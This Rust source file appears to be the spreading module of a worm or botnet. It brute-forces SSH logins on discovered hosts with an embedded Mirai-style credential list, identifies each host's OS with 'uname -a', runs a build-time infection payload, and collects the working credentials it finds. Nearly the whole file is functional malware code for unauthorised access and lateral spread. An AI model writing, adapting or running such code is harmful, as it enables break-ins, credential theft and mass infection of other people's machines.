use std::io::Read;
use std::net::TcpStream;
use std::sync::Mutex;
use anyhow::anyhow;
use ssh2::Session;
use crate::tasks::NetworkHost;
use rayon::prelude::*;

const SSH_CONNECT_TIMEOUT: u32 = 5000;
const SPREAD_THREADS: usize = 6;
static OS_ID_COMMAND: &'static str = "uname -a";
static DICTIONARY: &'static str = include_str!("../../src/ext/mirai-botnet.txt");

static LINUX: &'static str = "linux";
static LINUX_PAYLOAD: &'static str = env!("SSH_PAYLOAD_LINUX");
static MACOS: &'static str = "darwin";
static MACOS_PAYLOAD: &'static str = env!("SSH_PAYLOAD_LINUX");


/// Tries to connect to a host over SSH with given credentials
///
/// # Returns
/// If successful, a SSH session, otherwise an error
///
/// # Errors
/// If socket time out, or if the given credentials are invalid
fn ssh_connect(host: &String, username: &String, password: &String)
               -> Result<Session, anyhow::Error> {
    let tcp = TcpStream::connect(host)?;
    let mut sess = Session::new()?;
    sess.set_timeout(SSH_CONNECT_TIMEOUT);
    sess.set_tcp_stream(tcp);
    sess.handshake()?;
    sess.userauth_password(username.as_str(), password.as_str())?;
    if !sess.authenticated() {
        return Err(anyhow::Error::msg("SSH authentication failed"));
    }

    Ok(sess)
}

/// Runs a command in a given SSH session
///
/// # Returns
/// If successful, the output string, otherwise an error
///
/// # Errors
/// If the session fails to generate a channel, fails to execute the command, fails to read the
/// output or fails to close the channel
fn run_command(sess: &Session, command: String) -> Result<String, anyhow::Error> {
    // Run command
    let mut channel = sess.channel_session()?;
    channel.exec(command.as_str())?;

    // Collect output
    let mut s = String::new();
    channel.read_to_string(&mut s)?;
    channel.wait_close();

    Ok(s)
}

/// Attempts to identify the OS of the given SSH session by running 'uname -a'
///
/// # Returns
/// If successful, if the OS is either Linux or Macos, otherwise, an error
///
/// # Errors
/// If the command fails, or if the output fails during parsing
fn identify_os(sess: &Session) -> Result<String, anyhow::Error> {
    let output = run_command(sess, OS_ID_COMMAND.to_string())?;
    let split_output = output.split(' ').collect::<Vec<&str>>();

    if split_output.len() < 1 {
        return Err(anyhow::Error::msg("Failed to parse OS identification string"));
    }
    let host_os = split_output[0].to_lowercase().to_string();

    #[cfg(debug_assertions)]
    println!("Identified host OS: {}", host_os);

    Ok(host_os)
}


/// Attempts to spread to another host
/// Firsts attempts to initialise a connection with the given credentials,
/// then tries to identify what OS the host runs and finally tries to execute a payload
///
/// # Returns
/// If successfully connected to the host, the host with correct credentials is returned,
/// included with the host OS and if the payload was run or not (if those operations are successful)
fn try_ssh_spread(host: &String, username: &String, password: &String) -> Option<String> {
    // Initialise connection
    let sess = match ssh_connect(host, username, password) {
        Ok(val) => val,
        Err(e) => {
            return None;
        }
    };

    #[cfg(debug_assertions)]
    println!("Connected to host: {} {}:{}", host, username, password);
    let mut res = format!("{} {}:{}",
                          host.to_string(),
                          username.to_string(),
                          password.to_string());

    // Identify OS
    let host_os = match identify_os(&sess) {
        Ok(val) => val,
        Err(e) => {
            #[cfg(debug_assertions)]
            println!("Failed to identify OS: {}", e);
            return Some(res);
        }
    };
    res.push_str(&*format!(" {}", host_os));

    // Chose payload based on OS
    let payload = if host_os == MACOS {
        MACOS_PAYLOAD.to_string()
    } else {
        // If not MacOS, assume and test Linux!
        LINUX_PAYLOAD.to_string()
    };

    // Execute payload
    match run_command(&sess, payload) {
        Ok(_) => {
            #[cfg(debug_assertions)]
            println!("Ran payload on host {}, pray for successful infection...", host);
            res.push_str(" - Payload was run");
        }
        Err(e) => {
            #[cfg(debug_assertions)]
            println!("Failed to run payload: {}", e);
            res.push_str(" - Payload failed to run");
        }
    };

    return Some(res);
}

/// Tries to spread to a set of given hosts over SSH
///
/// # Return
/// A set of all hosts that the SSH spread was successful in some way, where the least
/// information is the correct SSH credentials for that host.
///
/// # Errors
/// If fails to create the thread pool
fn ssh_spread(hosts: Vec<NetworkHost>) -> Result<Vec<String>, anyhow::Error> {
    #[cfg(debug_assertions)]
    println!("Trying to spread to hosts: {:?}", hosts);

    let pool = rayon::ThreadPoolBuilder::new()
        .num_threads(SPREAD_THREADS)
        .build()?;
    let mut res: Mutex<Vec<String>> = Mutex::new(Vec::new());

    pool.install(|| {
        DICTIONARY
            .split("\n")
            .collect::<Vec<&str>>()
            .into_par_iter()
            .map(|un_pw| {
                let split = un_pw.split(' ').collect::<Vec<&str>>();
                for h in &hosts {
                    if split.len() != 2 {
                        continue;
                    }
                    match try_ssh_spread(
                        &format!("{}:{}", h.ip, h.open_ports[0].port),
                        &split[0].to_string(),
                        &split[1].to_string()) {
                        Some(val) => res.lock().unwrap().push(val),
                        _ => {}
                    };
                }
                un_pw
            })
            .collect::<Vec<&str>>();
    });
    let res = res.lock().unwrap().clone();
    Ok(res)
}

